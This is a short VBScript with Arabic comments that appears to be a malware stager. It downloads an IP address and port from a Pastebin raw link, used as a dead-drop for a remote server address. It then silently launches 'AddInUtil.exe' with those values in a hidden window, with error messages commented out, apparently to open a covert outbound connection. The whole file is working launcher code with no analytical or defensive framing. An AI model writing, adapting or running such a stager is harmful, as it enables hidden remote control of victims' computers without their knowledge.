' إنشاء كائن لجلب البيانات من Pastebin
Set Http = CreateObject("MSXML2.XMLHTTP")
Http.Open "GET", "https://pastebin.com/raw/5dMffKGy", False
Http.Send

' التحقق من نجاح الطلب
If Http.Status = 200 Then
    ' استخراج النص من الرابط (الـ IP والمنفذ)
    Data = Http.ResponseText
    ' تقسيم النص إلى IP و Port (مفترض أن النص فيه "IP Port" مفصولين بمسافة)
    Arr = Split(Trim(Data), " ")
    If UBound(Arr) >= 1 Then
        IP = Arr(0)   ' عنوان IP
        Port = Arr(1) ' المنفذ

        ' تشغيل الأمر باستخدام IP و Port
        Set WShell = CreateObject("WScript.Shell")
        WShell.Run "AddInUtil.exe " & IP & " " & Port, 0, False
        Set WShell = Nothing
    Else
        ' رسالة اختبارية إذا لم يتم العثور على البيانات بشكل صحيح (اختياري)
        ' MsgBox "خطأ في قراءة البيانات من Pastebin"
    End If
Else
    ' رسالة اختبارية إذا فشل الاتصال بـ Pastebin (اختياري)
    ' MsgBox "فشل في جلب البيانات من Pastebin"
End If

' تحرير الموارد
Set Http = Nothing